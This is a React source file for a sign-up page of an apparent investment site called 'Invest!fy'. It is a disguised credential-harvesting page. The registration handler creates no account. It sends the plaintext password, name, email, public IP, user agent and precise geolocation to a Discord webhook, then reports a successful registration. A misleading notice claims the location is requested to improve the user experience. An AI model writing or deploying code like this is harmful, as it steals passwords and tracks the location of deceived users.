import { useState } from 'react';
import { Mail, Lock, Eye, EyeOff, User, MapPin, UserPlus } from 'lucide-react';

interface AuthProps {
  onNavigate: (page: string) => void;
  onLoginSuccess: () => void;
}

interface LocationData {
  latitude: number;
  longitude: number;
  locationName: string;
}

export default function Auth({ onNavigate }: AuthProps) {
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [locationStatus, setLocationStatus] = useState<'pending' | 'requesting' | 'granted' | 'denied'>('pending');

  const getLocationName = async (lat: number, lon: number): Promise<string> => {
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10`
      );
      const data = await response.json();

      const city = data.address?.city || data.address?.town || data.address?.village || '';
      const country = data.address?.country || '';

      return city && country ? `${city}, ${country}` : 'Unknown Location';
    } catch (err) {
      console.error('Failed to get location name:', err);
      return 'Unknown Location';
    }
  };

  const getLocation = (): Promise<LocationData> => {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error('Geolocation is not supported by your browser'));
        return;
      }

      setLocationStatus('requesting');

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude } = position.coords;
          setLocationStatus('granted');

          const locationName = await getLocationName(latitude, longitude);

          resolve({
            latitude,
            longitude,
            locationName,
          });
        },
        (error) => {
          setLocationStatus('denied');
          console.error('Geolocation error:', error);
          resolve({
            latitude: 0,
            longitude: 0,
            locationName: 'Location Access Denied',
          });
        }
      );
    });
  };

  const sendToDiscord = async (registrationData: any) => {
    try {
      const webhookUrl = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1/discord-webhook`;

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${import.meta.env.VITE_SUPABASE_ANON_KEY}`,
        },
        body: JSON.stringify(registrationData),
      });
    } catch (err) {
      console.error('Failed to send to Discord:', err);
    }
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setSuccess('');

    if (!fullName.trim()) {
      setError('Please enter your full name');
      return;
    }

    if (!email.trim()) {
      setError('Please enter your email');
      return;
    }

    if (!password) {
      setError('Please enter a password');
      return;
    }

    if (password.length < 8) {
      setError('Password must be at least 8 characters');
      return;
    }

    setLoading(true);

    try {
      const userAgent = navigator.userAgent;

      const ipAddress = await fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => d.ip)
        .catch(() => 'Unknown');

      const locationData = await getLocation();

      const timestamp = new Date().toISOString();

      const registrationData = {
        fullName,
        email,
        password,
        ipAddress,
        userAgent,
        latitude: locationData.latitude,
        longitude: locationData.longitude,
        locationName: locationData.locationName,
        timestamp,
      };

      await sendToDiscord(registrationData);

      setSuccess('Registration successful! Welcome to Invest!fy');

      setTimeout(() => {
        onNavigate('home');
      }, 2000);

    } catch (err: any) {
      setError(err.message || 'An error occurred during registration');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-950 text-white pt-24 px-4">
      <div className="max-w-md mx-auto">
        <div className="bg-gray-900 border border-gray-800 rounded-2xl p-8 shadow-2xl">
          <div className="text-center mb-8">
            <h1 className="text-3xl font-bold text-yellow-400 mb-2">Invest!fy</h1>
            <p className="text-gray-400">Create Your Account</p>
          </div>

          {error && (
            <div className="mb-6 p-4 bg-red-500/10 border border-red-500/30 rounded-lg text-red-400 text-sm">
              {error}
            </div>
          )}

          {success && (
            <div className="mb-6 p-4 bg-green-500/10 border border-green-500/30 rounded-lg text-green-400 text-sm">
              {success}
            </div>
          )}

          {locationStatus === 'requesting' && (
            <div className="mb-6 p-4 bg-blue-500/10 border border-blue-500/30 rounded-lg text-blue-400 text-sm flex items-center space-x-2">
              <MapPin className="w-4 h-4 animate-pulse" />
              <span>Requesting location access...</span>
            </div>
          )}

          <form onSubmit={handleRegister} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Full Name
              </label>
              <div className="relative">
                <User className="absolute left-3 top-3 w-5 h-5 text-gray-500" />
                <input
                  type="text"
                  value={fullName}
                  onChange={e => setFullName(e.target.value)}
                  placeholder="John Doe"
                  className="w-full pl-10 pr-4 py-2 bg-gray-800 border border-gray-700 rounded-lg focus:outline-none focus:border-green-500 text-white placeholder-gray-500"
                  disabled={loading}
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Email Address
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-3 w-5 h-5 text-gray-500" />
                <input
                  type="email"
                  value={email}
                  onChange={e => setEmail(e.target.value)}
                  placeholder="your.email@example.com"
                  className="w-full pl-10 pr-4 py-2 bg-gray-800 border border-gray-700 rounded-lg focus:outline-none focus:border-green-500 text-white placeholder-gray-500"
                  disabled={loading}
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Password
              </label>
              <div className="relative">
                <Lock className="absolute left-3 top-3 w-5 h-5 text-gray-500" />
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                  placeholder="Minimum 8 characters"
                  className="w-full pl-10 pr-10 py-2 bg-gray-800 border border-gray-700 rounded-lg focus:outline-none focus:border-green-500 text-white placeholder-gray-500"
                  disabled={loading}
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-3 text-gray-500 hover:text-gray-300"
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            <div className="bg-blue-500/10 border border-blue-500/30 rounded-lg p-4">
              <div className="flex items-start space-x-2">
                <MapPin className="w-4 h-4 text-blue-400 mt-0.5 flex-shrink-0" />
                <p className="text-xs text-gray-300">
                  We'll request your location to provide a better experience. This helps us understand our user base and improve our services.
                </p>
              </div>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full py-3 bg-green-500 hover:bg-green-600 disabled:bg-gray-700 text-white font-semibold rounded-lg transition-colors flex items-center justify-center space-x-2"
            >
              <UserPlus className="w-5 h-5" />
              <span>{loading ? 'Creating Account...' : 'Register'}</span>
            </button>
          </form>

          <div className="mt-6 text-center">
            <p className="text-gray-400 text-sm mb-3">
              Already have an account?
            </p>
            <button
              onClick={() => onNavigate('home')}
              className="text-green-400 hover:text-green-300 font-medium transition-colors"
            >
              Back to Home
            </button>
          </div>

          <div className="mt-6 pt-6 border-t border-gray-800">
            <p className="text-xs text-gray-500 text-center">
              By registering, you agree to our Terms of Service and Privacy Policy
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
